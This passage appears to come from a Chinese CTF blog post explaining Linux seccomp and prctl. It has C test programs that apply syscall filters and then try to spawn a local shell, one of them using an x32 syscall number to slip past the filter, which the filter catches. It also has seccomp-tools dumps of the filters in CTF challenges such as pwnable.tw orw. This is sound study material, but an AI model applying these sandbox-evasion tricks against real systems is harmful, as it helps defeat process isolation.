<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys/prctl.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void)&#123;</span><br><span class="line">	prctl(PR_SET_NO_NEW_PRIVS,1,0,0,0);</span><br><span class="line"></span><br><span class="line">	char * filename = &quot;/bin/sh&quot;;</span><br><span class="line">	char * argv[] = &#123;&quot;/bin/sh&quot;,NULL&#125;;</span><br><span class="line">	char * envp[] = &#123;NULL&#125;;</span><br><span class="line">	write(1,&quot;i will give you a shell\n&quot;,24);</span><br><span class="line">	syscall(59,filename,argv,envp);//execve</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行效果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># veritas @ ubuntu in ~/test/seccomp</span><br><span class="line">$ ./prctl_test                  </span><br><span class="line">i will give you a shell</span><br><span class="line">$ sudo sh</span><br><span class="line">sudo: effective uid is not 0, is sudo installed setuid root?</span><br><span class="line">$ whoami</span><br><span class="line">veritas</span><br><span class="line">$ id</span><br><span class="line">uid=1000(veritas) gid=1000(veritas) groups=1000(veritas),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)</span><br><span class="line">$ sudo</span><br><span class="line">sudo: effective uid is not 0, is sudo installed setuid root?</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
<p>当option为<code>PR_SET_SECCOMP</code>(22)时,效果就是我们上面的seccomp了,只不过这里的格式略有不同</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">PR_SET_SECCOMP (since Linux 2.6.23)</span><br><span class="line">   Set the secure computing (seccomp) mode for the calling  thread,</span><br><span class="line">   to limit the available system calls.  The more recent seccomp(2)</span><br><span class="line">   system  call  provides  a  superset  of  the  functionality   of</span><br><span class="line">   PR_SET_SECCOMP.</span><br><span class="line"></span><br><span class="line">   The  seccomp  mode is selected via arg2.  (The seccomp constants</span><br><span class="line">   are defined in &lt;linux/seccomp.h&gt;.)</span><br><span class="line"></span><br><span class="line">   With arg2 set to SECCOMP_MODE_STRICT, the only system calls that</span><br><span class="line">   the  thread is permitted to make are read(2), write(2), _exit(2)</span><br><span class="line">   (but not exit_group(2)), and sigreturn(2).  Other  system  calls</span><br><span class="line">   result  in  the  delivery  of  a  SIGKILL signal.  Strict secure</span><br><span class="line">   computing mode is useful for number-crunching applications  that</span><br><span class="line">   may  need  to  execute  untrusted byte code, perhaps obtained by</span><br><span class="line">   reading from a pipe or socket.  This operation is available only</span><br><span class="line">   if the kernel is configured with CONFIG_SECCOMP enabled.</span><br><span class="line"></span><br><span class="line">   With  arg2  set  to  SECCOMP_MODE_FILTER  (since Linux 3.5), the</span><br><span class="line">   system calls allowed are defined by  a  pointer  to  a  Berkeley</span><br><span class="line">   Packet  Filter  passed  in  arg3.  This argument is a pointer to</span><br><span class="line">   struct sock_fprog; it can be designed to filter arbitrary system</span><br><span class="line">   calls and system call arguments.  This mode is available only if</span><br><span class="line">   the kernel is configured with CONFIG_SECCOMP_FILTER enabled.</span><br><span class="line"></span><br><span class="line">   If SECCOMP_MODE_FILTER filters permit fork(2), then the  seccomp</span><br><span class="line">   mode  is  inherited by children created by fork(2); if execve(2)</span><br><span class="line">   is  permitted,  then  the  seccomp  mode  is  preserved   across</span><br><span class="line">   execve(2).  If the filters permit prctl() calls, then additional</span><br><span class="line">   filters can be added; they are run in order until the first non-</span><br><span class="line">   allow result is seen.</span><br><span class="line"></span><br><span class="line">   For   further   information,   see   the   kernel   source  file</span><br><span class="line">   Documentation/prctl/seccomp_filter.txt.</span><br></pre></td></tr></table></figure>
<p>解释一下,如果arg2为<code>SECCOMP_MODE_STRICT</code>(1),则只允许调用read,write,_exit(not exit_group),sigreturn这几个syscall.如果arg2为<code>SECCOMP_MODE_FILTER</code>(2),则为过滤模式,其中对syscall的限制通过arg3用BPF(Berkeley Packet Filter)的形式传进来,是指向struct sock_fprog数组的指针.</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *	Try and keep these values and structures similar to BSD, especially</span></span><br><span class="line"><span class="comment"> *	the BPF code definitions which need to match so you can share filters</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> &#123;</span>	<span class="comment">/* Filter block */</span></span><br><span class="line">	__u16	code;   <span class="comment">/* Actual filter code */</span></span><br><span class="line">	__u8	jt;	<span class="comment">/* Jump true */</span></span><br><span class="line">	__u8	jf;	<span class="comment">/* Jump false */</span></span><br><span class="line">	__u32	k;      <span class="comment">/* Generic multiuse field */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> &#123;</span>	<span class="comment">/* Required for SO_ATTACH_FILTER. */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span>		len;	<span class="comment">/* Number of filter blocks */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> *<span class="title">filter</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>这里可以看到部分解释<a href="https://eigenstate.org/notes/seccomp" target="_blank" rel="noopener">https://eigenstate.org/notes/seccomp</a></p>
<p>使用例子<br>我们可以把之前<code>simple_syscall_seccomp</code>中的seccomp改为prctl试试</p>
<p>首先,有一个叫<code>seccomp_export_bpf</code>的函数能够将设置的seccomp以bpf的形式导出,我们稍稍修改simple_syscall_seccomp.c</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc -g simple_syscall_seccomp.c -o simple_syscall_seccomp -lseccomp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	scmp_filter_ctx ctx;</span><br><span class="line">	ctx = seccomp_init(SCMP_ACT_ALLOW);</span><br><span class="line">	seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(write),<span class="number">1</span>,SCMP_A2(SCMP_CMP_EQ,<span class="number">0x10</span>));</span><br><span class="line">	seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve),<span class="number">0</span>);</span><br><span class="line">	seccomp_load(ctx);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> fd = open(<span class="string">"bpf.out"</span>,O_WRONLY);</span><br><span class="line">	seccomp_export_bpf(ctx,fd);</span><br><span class="line">	close(fd);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> * filename = <span class="string">"/bin/sh"</span>;</span><br><span class="line">	<span class="keyword">char</span> * argv[] = &#123;<span class="string">"/bin/sh"</span>,<span class="literal">NULL</span>&#125;;</span><br><span class="line">	<span class="keyword">char</span> * envp[] = &#123;<span class="literal">NULL</span>&#125;;</span><br><span class="line">	write(<span class="number">1</span>,<span class="string">"i will give you a shell\n"</span>,<span class="number">24</span>);</span><br><span class="line">	write(<span class="number">1</span>,<span class="string">"1234567812345678"</span>,<span class="number">0x10</span>);</span><br><span class="line">	syscall(<span class="number">0x4000003b</span>,filename,argv,envp);<span class="comment">//execve</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从而得到了bpf</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># veritas @ ubuntu in ~/test/seccomp</span><br><span class="line">$ hexdump bpf.out</span><br><span class="line">0000000 0020 0000 0004 0000 0015 0900 003e c000</span><br><span class="line">0000010 0020 0000 0000 0000 0035 0007 0000 4000</span><br><span class="line">0000020 0015 0006 003b 0000 0015 0400 0001 0000</span><br><span class="line">0000030 0020 0000 0024 0000 0015 0200 0000 0000</span><br><span class="line">0000040 0020 0000 0020 0000 0015 0001 0010 0000</span><br><span class="line">0000050 0006 0000 0000 7fff 0006 0000 0000 0000</span><br><span class="line">0000060</span><br></pre></td></tr></table></figure>
<p>改用prctl:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">	</span><br><span class="line">	prctl(PR_SET_NO_NEW_PRIVS,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">sfi</span>[] = &#123;</span></span><br><span class="line">		&#123;<span class="number">0x20</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00000004</span>&#125;,</span><br><span class="line">		&#123;<span class="number">0x15</span>,<span class="number">0x00</span>,<span class="number">0x09</span>,<span class="number">0xc000003e</span>&#125;,</span><br><span class="line">		&#123;<span class="number">0x20</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00000000</span>&#125;,</span><br><span class="line">		&#123;<span class="number">0x35</span>,<span class="number">0x07</span>,<span class="number">0x00</span>,<span class="number">0x40000000</span>&#125;,</span><br><span class="line">		&#123;<span class="number">0x15</span>,<span class="number">0x06</span>,<span class="number">0x00</span>,<span class="number">0x0000003b</span>&#125;,</span><br><span class="line">		&#123;<span class="number">0x15</span>,<span class="number">0x00</span>,<span class="number">0x04</span>,<span class="number">0x00000001</span>&#125;,</span><br><span class="line">		&#123;<span class="number">0x20</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00000024</span>&#125;,</span><br><span class="line">		&#123;<span class="number">0x15</span>,<span class="number">0x00</span>,<span class="number">0x02</span>,<span class="number">0x00000000</span>&#125;,</span><br><span class="line">		&#123;<span class="number">0x20</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00000020</span>&#125;,</span><br><span class="line">		&#123;<span class="number">0x15</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x00000010</span>&#125;,</span><br><span class="line">		&#123;<span class="number">0x06</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x7fff0000</span>&#125;,</span><br><span class="line">		&#123;<span class="number">0x06</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00000000</span>&#125;</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">sfp</span> = &#123;</span><span class="number">12</span>,sfi&#125;;</span><br><span class="line"></span><br><span class="line">	prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&amp;sfp);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">char</span> * filename = <span class="string">"/bin/sh"</span>;</span><br><span class="line">	<span class="keyword">char</span> * argv[] = &#123;<span class="string">"/bin/sh"</span>,<span class="literal">NULL</span>&#125;;</span><br><span class="line">	<span class="keyword">char</span> * envp[] = &#123;<span class="literal">NULL</span>&#125;;</span><br><span class="line">	write(<span class="number">1</span>,<span class="string">"i will give you a shell\n"</span>,<span class="number">24</span>);</span><br><span class="line">	write(<span class="number">1</span>,<span class="string">"1234567812345678"</span>,<span class="number">0x10</span>);</span><br><span class="line">	syscall(<span class="number">0x4000003b</span>,filename,argv,envp);<span class="comment">//execve</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>成功拦截</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># veritas @ ubuntu in ~/test/seccomp</span><br><span class="line">$ ./prctl_test            </span><br><span class="line">i will give you a shell</span><br><span class="line">[1]    20120 invalid system call (core dumped)  ./prctl_test</span><br></pre></td></tr></table></figure>
<h2 id="How-to-reverse"><a href="#How-to-reverse" class="headerlink" title="How to reverse"></a>How to reverse</h2><p>可以使用现成的工具,感谢大佬们的开发orz<br><a href="https://github.com/david942j/seccomp-tools" target="_blank" rel="noopener">https://github.com/david942j/seccomp-tools</a></p>
<p>使用例子,seccomp和prctl都能用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"># veritas @ ubuntu in ~/test/seccomp</span><br><span class="line">$ seccomp-tools dump ./simple_syscall_seccomp</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x07 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0011</span><br><span class="line"> 0004: 0x15 0x06 0x00 0x0000003b  if (A == execve) goto 0011</span><br><span class="line"> 0005: 0x15 0x00 0x04 0x00000001  if (A != write) goto 0010</span><br><span class="line"> 0006: 0x20 0x00 0x00 0x00000024  A = args[2] &gt;&gt; 32</span><br><span class="line"> 0007: 0x15 0x00 0x02 0x00000000  if (A != 0x0) goto 0010</span><br><span class="line"> 0008: 0x20 0x00 0x00 0x00000020  A = args[2]</span><br><span class="line"> 0009: 0x15 0x01 0x00 0x00000010  if (A == 0x10) goto 0011</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0011: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> </span><br><span class="line"># veritas @ ubuntu in ~/test/seccomp</span><br><span class="line">$ seccomp-tools dump ./prctl_test            </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x07 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0011</span><br><span class="line"> 0004: 0x15 0x06 0x00 0x0000003b  if (A == execve) goto 0011</span><br><span class="line"> 0005: 0x15 0x00 0x04 0x00000001  if (A != write) goto 0010</span><br><span class="line"> 0006: 0x20 0x00 0x00 0x00000024  A = args[2] &gt;&gt; 32</span><br><span class="line"> 0007: 0x15 0x00 0x02 0x00000000  if (A != 0x0) goto 0010</span><br><span class="line"> 0008: 0x20 0x00 0x00 0x00000020  A = args[2]</span><br><span class="line"> 0009: 0x15 0x01 0x00 0x00000010  if (A == 0x10) goto 0011</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0011: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure></p>
<p>我们去测测之前的一些题目吧</p>
<ul>
<li><strong>pwnable.tw orw</strong></li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">orw_seccomp</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int16 v1; <span class="comment">// [esp+4h] [ebp-84h]</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// [esp+8h] [ebp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [esp+Ch] [ebp-7Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [esp+6Ch] [ebp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  qmemcpy(&amp;v3, stru_8048640, <span class="number">0x60</span>u);</span><br><span class="line">  v1 = <span class="number">12</span>;                                      <span class="comment">// 参数个数</span></span><br><span class="line">  v2 = &amp;v3;</span><br><span class="line">  prctl(<span class="number">38</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);                        <span class="comment">// prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)</span></span><br><span class="line">  prctl(<span class="number">22</span>, <span class="number">2</span>, &amp;v1);                            <span class="comment">// prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER)</span></span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.rodata:08048640 ; sock_filter stru_8048640[12]</span><br><span class="line">.rodata:08048640 stru_8048640    sock_filter &lt;20h, 0, 0, 4&gt;</span><br><span class="line">.rodata:08048640                                         ; DATA XREF: orw_seccomp+17↑o</span><br><span class="line">.rodata:08048648                 sock_filter &lt;15h, 0, 9, 40000003h&gt;</span><br><span class="line">.rodata:08048650                 sock_filter &lt;20h, 0, 0, 0&gt;</span><br><span class="line">.rodata:08048658                 sock_filter &lt;15h, 7, 0, 0ADh&gt;</span><br><span class="line">.rodata:08048660                 sock_filter &lt;15h, 6, 0, 77h&gt;</span><br><span class="line">.rodata:08048668                 sock_filter &lt;15h, 5, 0, 0FCh&gt;</span><br><span class="line">.rodata:08048670                 sock_filter &lt;15h, 4, 0, 1&gt;</span><br><span class="line">.rodata:08048678                 sock_filter &lt;15h, 3, 0, 5&gt;</span><br><span class="line">.rodata:08048680                 sock_filter &lt;15h, 2, 0, 3&gt;</span><br><span class="line">.rodata:08048688                 sock_filter &lt;15h, 1, 0, 4&gt;</span><br><span class="line">.rodata:08048690                 sock_filter &lt;6, 0, 0, 50026h&gt;</span><br><span class="line">.rodata:08048698                 sock_filter &lt;6, 0, 0, 7FFF0000h&gt;</span><br></pre></td></tr></table></figure>
<p>用seccomp-tools得到以下结果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ seccomp-tools dump ./orw.bin               </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x15 0x07 0x00 0x000000ad  if (A == rt_sigreturn) goto 0011</span><br><span class="line"> 0004: 0x15 0x06 0x00 0x00000077  if (A == sigreturn) goto 0011</span><br><span class="line"> 0005: 0x15 0x05 0x00 0x000000fc  if (A == exit_group) goto 0011</span><br><span class="line"> 0006: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0011</span><br><span class="line"> 0007: 0x15 0x03 0x00 0x00000005  if (A == open) goto 0011</span><br><span class="line"> 0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011</span><br><span class="line"> 0009: 0x15 0x01 0x00 0x00000004  if (A == write) goto 0011</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38)</span><br><span class="line"> 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br></pre></td></tr></table></figure>
<p>在i386下,只允许了write,read,open,exit,exit_group,sigreturn,rt_sigreturn</p>
<p>所以这题没法用execve拿shell</p>
<ul>
<li><strong>0ctf misc mathgame</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">$ seccomp-tools dump ./subtraction</span><br><span class="line">Starting system, please wait...</span><br><span class="line">System started!</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x01 0x00 0x40000003  if (A == ARCH_I386) goto 0003</span><br><span class="line"> 0002: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0003: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0004: 0x15 0x00 0x01 0x000000ad  if (A != rt_sigreturn) goto 0006</span><br><span class="line"> 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0006: 0x15 0x00 0x01 0x00000077  if (A != sigreturn) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0008: 0x15 0x00 0x01 0x000000fc  if (A != exit_group) goto 0010</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0010: 0x15 0x00 0x01 0x00000001  if (A != exit) goto 0012</span><br><span class="line"> 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0012: 0x15 0x00 0x01 0x00000005  if (A != open) goto 0014</span><br><span class="line"> 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0014: 0x15 0x00 0x01 0x00000003  if (A != read) goto 0016</span><br><span class="line"> 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0016: 0x15 0x00 0x01 0x00000004  if (A != write) goto 0018</span><br><span class="line"> 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0018: 0x15 0x00 0x01 0x000000c5  if (A != fstat64) goto 0020</span><br><span class="line"> 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0020: 0x15 0x00 0x01 0x00000036  if (A != ioctl) goto 0022</span><br><span class="line"> 0021: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0022: 0x15 0x00 0x01 0x0000008c  if (A != _llseek) goto 0024</span><br><span class="line"> 0023: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0024: 0x15 0x00 0x01 0x000000c0  if (A != mmap2) goto 0026</span><br><span class="line"> 0025: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0026: 0x15 0x00 0x01 0x0000005b  if (A != munmap) goto 0028</span><br><span class="line"> 0027: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0028: 0x15 0x00 0x01 0x0000002d  if (A != brk) goto 0030</span><br><span class="line"> 0029: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0030: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>
<p>也就是只允许了上面能看到的那些syscall</p>
<ul>
<li><strong>qwb2018 xx_game</strong></li>
</ul>
